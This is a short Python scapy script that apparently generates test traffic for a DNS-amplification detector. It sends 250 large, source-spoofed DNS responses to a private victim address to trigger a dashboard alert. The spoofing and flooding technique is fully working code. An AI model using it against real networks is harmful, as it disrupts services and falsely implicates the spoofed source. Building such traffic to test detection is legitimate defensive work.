import time
import random
from scapy.all import *

def simulate_amplification_flood():
    print("[*] Simulating Amplified DNS Responses arriving at a victim machine...")
    print("[*] Sending a flood of massive DNS responses (Attack simulation)")
    
    victim_ip = "192.168.1.250" # Arbitrary victim IP
    amplifier_ip = "8.8.8.8"    # Spoofed source (the DNS resolver)
    
    # We pad the DNS record to make the response large, but keep it under the 1500 byte MTU limit for Wi-Fi
    padding = "A" * 1200
    
    # Send 250 packets as fast as possible to trigger the 1-second volumetric threshold
    for i in range(250):
        pkt = IP(src=amplifier_ip, dst=victim_ip)/UDP(sport=53, dport=random.randint(1024, 65535))/DNS(
            qr=1, # 1 means this is a RESPONSE
            aa=1, 
            rd=0, 
            ra=0, 
            qdcount=1, 
            ancount=1,
            qd=DNSQR(qname="target.local", qtype=255),
            an=DNSRR(rrname="target.local", type="TXT", rdata=padding)
        )
        send(pkt, verbose=False)
        
    print("[+] Sent 250 massive DNS responses! Check Streamlit Dashboard immediately.")

if __name__ == "__main__":
    simulate_amplification_flood()
